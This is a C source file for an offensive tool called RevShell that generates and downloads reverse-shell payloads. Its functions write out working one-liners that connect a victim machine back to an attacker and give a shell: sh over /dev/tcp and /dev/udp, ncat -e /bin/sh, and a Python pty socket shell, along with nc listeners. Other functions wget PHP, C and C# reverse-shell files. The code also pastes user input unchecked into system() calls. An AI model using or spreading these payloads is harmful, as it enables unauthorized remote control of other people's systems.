#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Normal Functions   ********************************************   Normal Functions \\ 

void PrintHelp();
void GetPhp();
void GetShell();
void GetC();
void GetCsharp();
void GetNcat();
void GetPython();

// Functions With Full Cred *******************************************   Functions With Full Cred \\ 

void GetPhp_Full_Cred();
void GetShell_Full_Cred();
void GetCsharp_Full_Cred();
void GetNcat_Full_Cred();
void GetC_Full_Cred();
void GetPython_Full_Cred();

 // Global Variables ***************************************** Global Variables \\ 

char * argument1;
char * argument;
char * ip_port;
char * ip_addr;
char * argument_ip;

// FrameWork ************************************************* FrameWork \\ 


void framework();


// Main Function  *******************************************   Main Function\\ 

int main(int argc , char* argv[])
{
	// If Statements ************************************* If Statements // 

	if (argc < 2 || argc == 1)
	{
		printf("RevShell version 0.0.4\n\nUse -h or --help for help\n");
	}
	else if ((strcmp(argv[1],"--framework"))==0 && argc == 2 )
	{
		framework();
	}

	else if ((strcmp(argv[1],"-h"))==0 || (strcmp(argv[1],"--help"))==0 )
	{
		// (strcmp(argv[1],"--type"))==0 && argc == 3
		PrintHelp();
	}
	else if ((strcmp(argv[1],"--type"))==0 && argc == 3 )
	{
		argument = argv[2];
		if ((strcmp(argument,"php")==0))
		{
			GetPhp();
		}
		else if ((strcmp(argument,"shell")==0))
		{
			GetShell();
		}
		else if ((strcmp(argument,"csharp")==0))
		{
			GetCsharp();
		}
		else if ((strcmp(argument,"ncat")==0))
		{
			GetNcat();
		}
		else if ((strcmp(argument,"c")==0))
		{
			GetC();
		}
		else if ((strcmp(argument,"python")==0))
		{
			GetPython();
		}
		else
		{	
			printf("Usage : --type <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else if ((strcmp(argv[1],"-t"))==0 && argc == 3 )
	{
		argument = argv[2];
		if ((strcmp(argument,"php")==0))
		{
			GetPhp();
		}
		else if ((strcmp(argument,"shell")==0))
		{
			GetShell();
		}
		else if ((strcmp(argument,"csharp")==0))
		{
			GetCsharp();
		}		
		else if ((strcmp(argument,"ncat")==0))
		{
			GetNcat();
		}
		else if ((strcmp(argument,"c")==0))
		{
			GetC();
		}
		else if ((strcmp(argument,"python")==0))
		{
			GetPython();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else if ((strcmp(argv[1],"-t"))==0 && (strcmp(argv[3],"--ip"))==0 && (strcmp(argv[5],"-p"))==0 &&argc == 7 )
	{
		//ip_addr = argv[3]; ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4] -p[5] 0000[6]
		argument_ip = argv[2];
		ip_addr = argv[4];
		ip_port = argv[6]; 


		if ((strcmp(argument_ip,"php")==0))
		{
			void GetPhp_Full_Cred();
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
		
	}
	else if ((strcmp(argv[1],"-t"))==0 && (strcmp(argv[3],"--ip"))==0 && (strcmp(argv[5],"--port"))==0 &&argc == 7 )
	{
		//ip_addr = argv[3]; ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4] -p[5] 0000[6]
		argument_ip = argv[2];
		ip_addr = argv[4];
		ip_port = argv[6]; 


		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : ./catshell -t <php,shell,csharp,c,ncat>\n");
		}


	}
	else if ((strcmp(argv[1],"--type"))==0 && (strcmp(argv[3],"--ip"))==0 && (strcmp(argv[5],"--port"))==0 &&argc == 7 )
	{
		//ip_addr = argv[3]; ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4] -p[5] 0000[6]
		argument_ip = argv[2];
		ip_addr = argv[4];
		ip_port = argv[6]; 
	

		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"-p"))==0 && (strcmp(argv[5],"-t"))==0 &&argc == 7 )
	{
		// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}

	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"-p"))==0 && (strcmp(argv[5],"-t"))==0 &&argc == 7 )
	{
		// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}
	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"--port"))==0 && (strcmp(argv[5],"--type"))==0 &&argc == 7 )
	{
		// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}

	}
	else if ((strcmp(argv[1],"--ip"))==0 && (strcmp(argv[3],"--port"))==0 && (strcmp(argv[5],"-t"))==0 &&argc == 7 )
	{
				// ./revshell[0] --ip[1] 127.0.0.1[2] -p[3] 0[4] -t[5] something[6]
		argument_ip = argv[6];
		ip_addr = argv[2];
		ip_port = argv[4];



		if ((strcmp(argument_ip,"php")==0))
		{
			GetPhp_Full_Cred();
		}
		else if ((strcmp(argument_ip,"shell")==0))
		{
			GetShell_Full_Cred();
		}
		else if ((strcmp(argument_ip,"csharp")==0))
		{
			GetCsharp_Full_Cred();
		}		
		else if ((strcmp(argument_ip,"ncat")==0))
		{
			GetNcat_Full_Cred();
		}	
		else if ((strcmp(argument_ip,"c")==0))
		{
			GetC_Full_Cred();
		}
		else if ((strcmp(argument_ip,"python")==0))
		{
			GetPython_Full_Cred();
		}

		else
		{	
			printf("Usage : -t <php,shell,csharp,c,ncat>\n");
		}

	}

	else if  ((strcmp(argv[1],"-t"))==0 && (strcmp(argv[3],"--ip"))==0 &&argc == 5)
	{
		// ./program[0] -t[1] php[2] --ip[3] 127.0.0.1[4]
		printf("Usage : ./catshell -t <type> --ip <ip> -p <port>\n\nPort : \"I'm sleeping where are u\"\n");
	}

	else
	{
		printf("Invalid parameter !\n\nUse -h or --help for help\n");
	}
	return 0;
}

void PrintHelp()
{
	printf("Usage : ./revshell [OPTION] .. [FILE]\n\nOptions :\n\n-h --help print this help page\n-t --type <php,csharp,shell,c,ncat>\n-p --port specify a port number <1 to 65,535>\n\nLong Options :\n\n--ip specify an ip address <bash , ncat , python > later updates\n--framework\n\nContact me when you find bugs <mrtankgt@outlook.com> MrEbrahimXD\n");
}

void GetPhp()
{
	printf("[*] Php RevShell Copied to current dir \n\n");
	system("wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php \n");
}

void GetShell()
{
	printf("[*] Made shell_revshell.txt UDP and TCP Change Ip and Port \n");
	system("echo \"Victim : sh -i >& /dev/tcp/<ip>/<port> 0>&1\nAttacker : nc -lnvp <port>\" > shell_revshell_tcp.txt && echo \"Victim : sh -i >& /dev/udp/<ip>/<port> 0>&1\nAttacker : nc -lnvp <port>\" > shell_revshell_udp.txt \n\n");
}

void GetCsharp()
{
	printf("[*] Made C# script at current dir \n");
	system("wget https://raw.githubusercontent.com/MrEbrahimXD/Raw-For-Revshell/main/csharp.cs \n");
}

void GetNcat()
{
	printf("[*] Ncat : ncat_help.txt created\n\n");
	system("echo \"Victim : ncat -e /bin/sh <ip> <port> \nListener : ncat -lnvp <port>\" > ncat_help.txt \n");
}

void GetC()
{
	printf("[*] C programming script created\n\n");
	system("wget https://raw.githubusercontent.com/MrEbrahimXD/Raw-For-Revshell/main/c_revshell.c \n");
}

void GetPython()
{
	printf("[*] Python RevShell Copied\n");
	system("echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<ip>\",<port>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_shell.txt \n");
}

void framework()
{
    system("clear");
	printf(R"EOF(
    ____           _____ __         ____
   / __ \___ _   _/ ___// /_  ___  / / /
  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
 / _, _/  __/ |/ /__/ / / / /  __/ / /  
/_/ |_|\___/|___/____/_/ /_/\___/_/_/   

*---------------------------------------*

    RevShell 0.0.4 FrameWork 

*---------------------------------------*

[ 1 ] Download RevShells File

[ 2 ] Create Fast RevShells

[ 3 ] Instant RevShell 

[ 4 ] Info
			)EOF");
    int framework_choice;
    printf("\nrv > ");
    scanf("%d" , &framework_choice);
    switch(framework_choice)
    {
        case 1: 
        	system("clear");
			printf(R"EOF(
    ____           _____ __         ____
   / __ \___ _   _/ ___// /_  ___  / / /
  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
 / _, _/  __/ |/ /__/ / / / /  __/ / /  
/_/ |_|\___/|___/____/_/ /_/\___/_/_/   

*---------------------------------------*

    RevShell 0.0.4 FrameWork : Download 

*---------------------------------------*

[ 1 ] PHP RevShell 

[ 2 ] C RevShell

[ 3 ] C# RevShell

[ 4 ] Python RevShell

[ 5 ] Shell RevShell

        		)EOF");
			int download_option;
			printf("\nrv > ");
			scanf("%d",&download_option);
			switch(download_option)
			{
				case 1:
					GetPhp();
					break;
				case 2:
					GetC();
					break;
				case 3:
					GetCsharp();
					break;
				case 4:
					GetPython();
					break;
				case 5:
					GetShell();
					break;
				default:
					printf("\n\nPlease try again choosing from 1 ==> 5\n\nUnexpected Error");
					break;

			}



        	break;
        case 2:
			system("clear");
			char ip_addr_framework[15];
			char port_framework[5];
			printf("Listening IP : ");
			scanf("%s",ip_addr_framework);
			printf("Listening Port : ");
			scanf("%s",port_framework);
			system("clear");
			ip_addr = ip_addr_framework;
			ip_port = port_framework;
			printf(R"EOF(
    ____           _____ __         ____
   / __ \___ _   _/ ___// /_  ___  / / /
  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
 / _, _/  __/ |/ /__/ / / / /  __/ / /  
/_/ |_|\___/|___/____/_/ /_/\___/_/_/   

*---------------------------------------*

    RevShell 0.0.4 FrameWork : Create

*---------------------------------------*

Listen IP : %s
Listen PORT : %s

[ 1 ] Shell RevShell

[ 2 ] Python RevShell

[ 3 ] Ncat RevShell

			)EOF",ip_addr_framework,port_framework);
			int create_option_framework;
			printf("\nrv > ");
			scanf("%d",&create_option_framework);
			switch(create_option_framework)
			{
				case 1:
					GetShell_Full_Cred();
					break;
				case 2:
					GetPython_Full_Cred();
					break;
				case 3:
					GetNcat_Full_Cred();
					break;
				default:
					printf("\n\nUnexpected Error");
					break;
			}
		case 3:
			printf("\nIn development.");
			break;
		case 4:
			system("clear");
			printf(R"EOF(
    ____           _____ __         ____
   / __ \___ _   _/ ___// /_  ___  / / /
  / /_/ / _ \ | / |__ \/ __ \/ _ \/ / / 
 / _, _/  __/ |/ /__/ / / / /  __/ / /  
/_/ |_|\___/|___/____/_/ /_/\___/_/_/   

*---------------------------------------*

    RevShell 0.0.4 FrameWork : Info

*---------------------------------------*

Developer : MrEbrahimXD

Version : 0.0.4

*--------------------------------------------------------------------------*
RevShell project is an open-source utility that decreases the time taken to 
perform or download a reverse shell code
*--------------------------------------------------------------------------*

- Don't use this tool for illegal activities , Use it at your own risk , Meant for Ethical Hackers

					)EOF");
				printf("\n");
				break;
		default:
        	printf("Unexpected Error");
        	break;

    }
}


// ****************************************************************************************************** \\ 
// IP Functions ---------------------------------------------------------------------------- IP Functions \\ 
// ****************************************************************************************************** \\ 

void GetPhp_Full_Cred()
{

}

void GetShell_Full_Cred()
{
	char cmd[194];
	printf("[*] Made shell_revshell.txt UDP and TCP with %s:%s\n" , ip_addr , ip_port );
	sprintf(cmd , "echo \"Victim : sh -i >& /dev/tcp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_tcp.txt && echo \"Victim : sh -i >& /dev/udp/%s/%s 0>&1\nAttacker : nc -lnvp %s\" > shell_revshell_udp.txt \n\n" , ip_addr , ip_port , ip_port , ip_addr , ip_port , ip_port);
	system(cmd);

}

void GetCsharp_Full_Cred()
{

}

void GetNcat_Full_Cred()
{
	char cmd[87];
	printf("[*] Ncat : ncat_help.txt created with ip %s and port : %s\n\n" , ip_addr , ip_port );
	sprintf(cmd , "echo \"Victim : ncat -e /bin/sh %s %s \nListener : ncat -lnvp %s\" > ncat_help.txt \n" , ip_addr , ip_port , ip_port );
	system(cmd);
}

void GetC_Full_Cred()
{

}

void GetPython_Full_Cred()
{
	char cmd[160];
	printf("[*] Python : python_revshell.txt made with %s:%s \n" , ip_addr , ip_port);
	sprintf(cmd , "echo \"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")'\" > python_revshell.txt \n" , ip_addr , ip_port );
	system(cmd);
}

// Instant Spawn ******************* Instant Spawn  \\ 

//void instant_python()
//{
//    char cmd[];
//    sprintf(cmd , "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'" , ip_addr , ip_port);
//    system(cmd);
//}
